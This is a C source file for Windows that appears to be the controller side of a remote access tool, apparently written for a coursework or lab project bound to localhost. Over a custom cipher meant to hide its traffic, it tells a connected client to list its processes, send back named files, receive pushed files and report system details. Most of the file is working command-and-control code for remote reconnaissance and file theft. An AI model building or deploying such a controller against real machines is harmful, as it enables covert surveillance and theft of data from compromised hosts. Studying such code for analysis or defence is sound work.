#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <wchar.h>

#define INT_SIZE   sizeof(uint32_t)
#define BUF_SIZE   8192
#define PROCS      0x73BF
#define UPLOAD     0x62CD
#define DOWNLOAD   0x9E7A
#define INFO       0xD3A8
#define EXIT_ERROR 1
#define EXIT_CLEAN 0

/*
 * Takes a uint32 and applies the cipher to it. This can be used in
 * a loop to encode a buffer before it's sent or after it's received.
 *
 * @param uint32_t    Value to apply the cipher to
 *
 * @returns uint32_t  Result of the cipher
 */
uint32_t cipher(uint32_t x) {
    // Variable declarations
	uint32_t y = 0, i;

	// Loop for the lower 31 bits
	for (i=0; i<31; i++) {
	    // Apply the cipher to y
		y ^= x;
		y += x << (i+1);

		// Shift x to preserve the lower i bits
		x <<= 1;
	}

	// Apply the final XOR to bit 32
	y ^= x;

	// Return the cipher result
	return y;
}

/*
 * Takes a character buffer, encodes it, and sends it to the client.
 *
 * @param SOCKET  Connected client socket
 * @param char*   Pointer to the buffer to send
 * @param DWORD   The length of the message to be sent
 *
 * @returns BOOL  Success result: TRUE success, FALSE failure
 */
BOOL send_encrypted(SOCKET sock, char* buf, DWORD len) {
    // Variable declarations
    DWORD bytes_wrote, i;

    // Length needs a ceiling to the nearest multiple of 4
    len += (INT_SIZE - len%INT_SIZE) % INT_SIZE;

    // Create a copy of the buffer to preserve the original one
    char copy[len];
    char *buf_ptr = copy;
    memcpy(copy, buf, len);

    // Apply the cipher to each chunk of 4 bytes in the buffer
    uint32_t *ptr = (uint32_t *) copy; // Pointer manipulation
    for (i=0; i<len; i+=INT_SIZE) {
        *ptr = cipher(*ptr);
        ptr++;
    }

    // While there's more data to send
    while (len > 0) {
        // Attempt to send the data to the server
        if (!WriteFile((HANDLE) sock, buf_ptr, len, &bytes_wrote, 0)) {
            // Return failure
            return FALSE;
        }

        // Adjust the length and buffer pointer based on the bytes sent
        len -= bytes_wrote;
        buf_ptr += bytes_wrote;
    }

    // Return success
    return TRUE;
}

/*
 * Takes a receives data from the client, decodes it, and saves
 * it to the given character buffer.
 *
 * @param SOCKET  Connected client socket
 * @param char*   Pointer to the buffer to store into
 * @param DWORD   The length of the message to be received
 *
 * @returns BOOL  Success result: TRUE success, FALSE failure
 */
BOOL recv_encrypted(SOCKET sock, char* buf, DWORD len) {
    // Variable declarations
    DWORD bytes_read, i, len2;
    char *buf_ptr = buf;
    uint32_t *ptr = (uint32_t *) buf; // Pointer manipulation

    // Length needs a ceiling to the nearest multiple of 4
    len += (INT_SIZE - len%INT_SIZE) % INT_SIZE;
    len2 = len;

    // While there's more data to receive
    while (len > 0) {
        // Attempt to receive data from the server
        if (!ReadFile((HANDLE) sock, buf_ptr, len, &bytes_read, 0)) {
            // Return failure
            return FALSE;
        }

        // Adjust the length and buffer pointer based on the bytes received
        len -= bytes_read;
        buf_ptr += bytes_read;
    }

    // Apply the cipher to each chunk of 4 bytes in the buffer
    for (i=0; i<len2; i+=INT_SIZE) {
        *ptr = cipher(*ptr);
        ptr++;
    }

    // Return success
    return TRUE;
}

/*
 * Elicits the client to send a list of running processes
 * to the server and prints out the list.
 *
 * @param SOCKET  Connected client socket
 *
 * @returns void  No return value
 */
void list_procs(SOCKET sock) {
    // Variable declarations
    int cmd = PROCS, size;
	char buffer[BUF_SIZE] = {0};

	// Attempt to send the list_procs command to the client
	if (!send_encrypted(sock, (char *)&cmd, sizeof(cmd))) {
		fprintf(stderr, "Failed to send list_procs command.\n");
		exit(EXIT_ERROR);
	}

	// Attempt to receive the data size from the client
	if (!recv_encrypted(sock, (char *)&size, sizeof(size))) {
		fprintf(stderr, "Failed to get data length.\n");
		exit(EXIT_ERROR);
	}

	// Attempt to read all the data from the client
	// and print it to stdout
	while (size > 0) {
		if (!recv_encrypted(sock, buffer, min(BUF_SIZE, size))) {
			fprintf(stderr, "Failed to receive all data.\n");
			exit(EXIT_ERROR);
		}
		
		printf("%s\n\n", buffer);
		size -= min(BUF_SIZE, size);
	}
}

/*
 * Elicits the client to upload a given file to the server
 * and saves it to a local file with the same filename.
 *
 * @param SOCKET  Connected client socket
 *
 * @returns void  No return value
 */
void upload_file(SOCKET sock) {
    // Variable declarations
	char buffer[BUF_SIZE] = {0};
	int cmd = UPLOAD, len;
	HANDLE file;
	uint64_t f_size;
	DWORD bytes_written;

	// Attempt to send the upload command to the client
	if (!send_encrypted(sock, (char *)&cmd, sizeof(cmd))) {
		fprintf(stderr, "Failed to send upload command.\n");
		exit(EXIT_ERROR);
	}

	// Get the filename from the user
    printf("File to get from the client: ");
	fgets(buffer, BUF_SIZE, stdin);
	buffer[strlen(buffer)-1] = 0x00;

	// Attempt to send the filename length to the client
	len = (int) strlen(buffer);
	if (!send_encrypted(sock, (char *)&len, sizeof(len))) {
		fprintf(stderr, "Failed to send the filename size.\n");
		exit(EXIT_ERROR);
	}

	// Attempt to send the filename to the client
	if (!send_encrypted(sock, buffer, len)) {
		fprintf(stderr, "Failed to send the filename.\n");
		exit(EXIT_ERROR);
	}

	// Attempt to create a local file with the same filename
	file = CreateFileA(buffer, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "Failed to create the file.\n");
		exit(EXIT_ERROR);
	}

	// Attempt to receive the file size from the client
	if (!recv_encrypted(sock, (char *)&f_size, sizeof(f_size))) {
		fprintf(stderr, "Failed to receive the file size.\n");
		CloseHandle(file);
		exit(EXIT_ERROR);
	}

	// Verify the client could read the file
	if (f_size == 0) {
		fprintf(stderr, "Client had error with the file.\n");
		CloseHandle(file);
		exit(EXIT_ERROR);
	}

	// Attempt to read the file data from the client
	// and write it to the local file
	while (f_size > 0) {
		if (!recv_encrypted(sock, buffer, min(BUF_SIZE, f_size))) {
			fprintf(stderr, "Failed to receive all file data.\n");
			CloseHandle(file);
			exit(EXIT_ERROR);
		}
		
		if (!WriteFile(file, buffer, min(BUF_SIZE, f_size), &bytes_written, 0)) {
			fprintf(stderr, "Failed to write data to the file.\n");
			CloseHandle(file);
			exit(EXIT_ERROR);
		}
		
		f_size -= min(BUF_SIZE, f_size);
	}

	// Notify the user about the success and close the file
	printf("Successfully received the file from the client.\n\n");
	CloseHandle(file);
}

/*
 * Elicits the client to download a given file from the server.
 * The client saves it to a file with the same filename.
 *
 * @param SOCKET  Connected client socket
 *
 * @returns void  No return value
 */
void download_file(SOCKET sock) {
    // Variable declarations
    char buffer[BUF_SIZE] = {0};
    int cmd = DOWNLOAD, len;
    HANDLE file;
    LARGE_INTEGER largeint;
    uint64_t f_size;
    DWORD bytes_read;

    // Attempt to send the download command to the client
    if (!send_encrypted(sock, (char *)&cmd, sizeof(cmd))) {
		fprintf(stderr, "Failed to send download command.\n");
		exit(EXIT_ERROR);
	}

    // Get the filename from the user
    printf("File to send to the client: ");
	fgets(buffer, BUF_SIZE, stdin);
	buffer[strlen(buffer)-1] = 0x00;

	// Attempt to send the filename length to the client
	len = (int) strlen(buffer);
	if (!send_encrypted(sock, (char *)&len, sizeof(len))) {
		fprintf(stderr, "Failed to send the filename size.\n");
		exit(EXIT_ERROR);
	}

	// Attempt to send the filename to the client
	if (!send_encrypted(sock, buffer, len)) {
		fprintf(stderr, "Failed to send the filename.\n");
		exit(EXIT_ERROR);
	}

	// Attempt to open the local file
    file = CreateFileA(buffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Failed to open the file.\n");
        exit(EXIT_ERROR);
    }

    // Attempt to send the file size to the client
    GetFileSizeEx(file, &largeint);
    f_size = largeint.QuadPart;
    if (!send_encrypted(sock, (char *)&f_size, sizeof(f_size))) {
		fprintf(stderr, "Failed to send the file size.\n");
        CloseHandle(file);
        exit(EXIT_ERROR);
    }

    // Attempt to send the file data to the client
    if (f_size > 0) {
        while (ReadFile(file, buffer, BUF_SIZE, &bytes_read, NULL) &&
               bytes_read != 0) {
            if (!send_encrypted(sock, buffer, bytes_read)) {
				fprintf(stderr, "Failed to send the file data.\n");
                CloseHandle(file);
                exit(EXIT_ERROR);
            }
        }
    }

    // Notify the user about the success and close the file
    printf("Successfully sent file to the client.\n\n");
    CloseHandle(file);
}

/*
 * Elicits the client to send information about the system
 * it is running on and prints the information.
 *
 * @param SOCKET  Connected client socket
 *
 * @returns void  No return value
 */
void client_info(SOCKET sock) {
    // Variable declarations
	int cmd = INFO, size;
	char buffer[BUF_SIZE] = {0};

	// Attempt to send the client_info command to the client
	if (!send_encrypted(sock, (char *)&cmd, sizeof(cmd))) {
		fprintf(stderr, "Failed to send client_info command.\n");
		exit(EXIT_ERROR);
	}

	// Attempt to receive the length of the data from the client
	if (!recv_encrypted(sock, (char *)&size, sizeof(size))) {
		fprintf(stderr, "Failed to get data length.\n");
		exit(EXIT_ERROR);
	}

    // Attempt to read all the data from the client
    // and print it to stdout
	while (size > 0) {
		if (!recv_encrypted(sock, buffer, min(BUF_SIZE, size))) {
			fprintf(stderr, "Failed to receive all data.\n");
			exit(EXIT_ERROR);
		}
		
		printf("%s\n\n", buffer);
		size -= min(BUF_SIZE, size);
	}
}

/*
 * Main Entry
 */
int main() {
    // Variable declarations
	SOCKET sock, client;
	struct sockaddr_in sock_addr;
	WSADATA wsa;
	int rv;
	char cmd[5];

    // Static IP and port for this project
	char ip_addr[] = "127.0.0.1";
	int port = 8888;

    // Attempt to initialize the Winsock library
	WSAStartup(MAKEWORD(2,2), &wsa);
	sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (sock == INVALID_SOCKET) {
		fprintf(stderr, "WSASocket() failed with error %d\n", WSAGetLastError());
		WSACleanup();
		return EXIT_ERROR;
	}

    // Set the server address for IPv4 using the static IP and port
    sock_addr.sin_port = htons(port);
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_addr.s_addr = inet_addr(ip_addr);

	// Attempt to bind the server to the port
	if (bind(sock, (PSOCKADDR) &sock_addr, sizeof(sock_addr)) == SOCKET_ERROR)
    {
        printf("bind() failed with error %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
        return EXIT_ERROR;
    }

	// Attempt to start listening for connections
	if (listen(sock, 5) == SOCKET_ERROR)
    {
        printf("listen() failed with error %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
        return EXIT_ERROR;
    }

	// Attempt to accept an incoming connection
	if ((client = accept(sock, NULL, NULL)) == INVALID_SOCKET) {
		printf("accept() failed with error %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return EXIT_ERROR;
	}

	// Loop until the exit command is received
	rv = 1;
	while (rv) {
	    // Notify the user of the command options
	    // and retrieve their choice
		printf("Commands:\n");
		printf("  1) List Processes\n");
		printf("  2) Get file\n");
		printf("  3) Send file\n");
		printf("  4) Client Information\n\n");
		printf("Please enter the command number to run or 'e' to exit: ");
		fgets(cmd, 5, stdin);
		printf("--------------------------------------------------------\n\n");

		// Run the command associated with the user's choice
		switch(cmd[0]) {
			case '1':
				list_procs(client);
				break;
			case '2':
				upload_file(client);
				break;
			case '3':
				download_file(client);
				break;
			case '4':
				client_info(client);
				break;
			case 'e':
				rv = 0;
				break;
			default:
			    printf("Invalid command choice '%c'.\n\n", cmd[0]);
				break;
		}
	}

    // Cleanup the Winsock library and exit
	WSACleanup();
	return EXIT_CLEAN;
}